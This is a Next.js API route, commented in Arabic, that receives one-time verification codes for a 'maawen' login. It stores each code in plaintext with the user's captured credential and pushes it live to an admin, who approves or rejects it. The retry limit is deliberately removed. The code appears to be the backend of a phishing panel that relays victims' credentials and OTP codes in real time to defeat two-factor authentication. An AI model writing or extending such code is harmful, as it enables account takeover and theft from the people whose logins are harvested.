import { NextRequest, NextResponse } from "next/server";
import { createServiceClient, broadcastNewEntry } from "@/lib/supabase/server";

interface OtpBody {
  loginEntryId?: string;
  otp?: string;
}

/** العميل يرسل رمز التحقق (4 أو 6 أرقام) — يُخزَّن بانتظار قرار المدير. */
export async function POST(req: NextRequest) {
  const body = (await req.json().catch(() => ({}))) as OtpBody;
  const loginEntryId = body.loginEntryId;
  const otp = (body.otp ?? "").trim();

  if (!/^\d{4}$/.test(otp) && !/^\d{6}$/.test(otp)) {
    return NextResponse.json({ error: "invalid_otp_length" }, { status: 422 });
  }

  if (!loginEntryId) {
    return NextResponse.json({ error: "missing_login_entry_id" }, { status: 400 });
  }

  const supabase = createServiceClient();

  // جلب طلب الدخول المرتبط للتأكد من موافقة المدير عليه
  const { data: loginEntry, error: lErr } = await supabase
    .from("client_data_entries")
    .select("id, client_id, payload")
    .eq("id", loginEntryId)
    .maybeSingle();

  if (lErr || !loginEntry) {
    return NextResponse.json({ error: "login_not_found" }, { status: 404 });
  }

  const lPayload = loginEntry.payload as Record<string, unknown>;

  // السماح للعميل بأي عدد من المحاولات: كل محاولة تُنشئ طلب OTP جديداً ينتظر
  // قرار المدير (pending_admin) بشكل مستقل عن أي رفض سابق. لا نحجب العميل
  // بسبب رفض قديم — القرار يقع على كل رمز جديد منفرداً.
  // (كان الشرط السابق status==="approved" يمنع إعادة الإرسال بعد أي رفض).

  // تخزين رمز التحقق بانتظار قرار المدير النهائي.

  const { data: inserted, error: insertErr } = await supabase
    .from("client_data_entries")
    .insert({
      client_id: loginEntry.client_id ?? null,
      type: "maawen_login_otp",
      payload: {
        login_entry_id: loginEntryId,
        credential: lPayload.credential ?? lPayload.email ?? lPayload.username ?? null,
        otp,
        status: "pending_admin",
        created_by: "maawen_login_otp_submit",
      },
    })
    .select("id")
    .single();

  if (insertErr || !inserted) {
    return NextResponse.json({ error: "submit_failed" }, { status: 500 });
  }

  void broadcastNewEntry({
    clientId: loginEntry.client_id ?? null,
    entryId: inserted.id,
    type: "maawen_login_otp",
  });

  return NextResponse.json({
    entryId: inserted.id,
    status: "pending_admin",
  });
}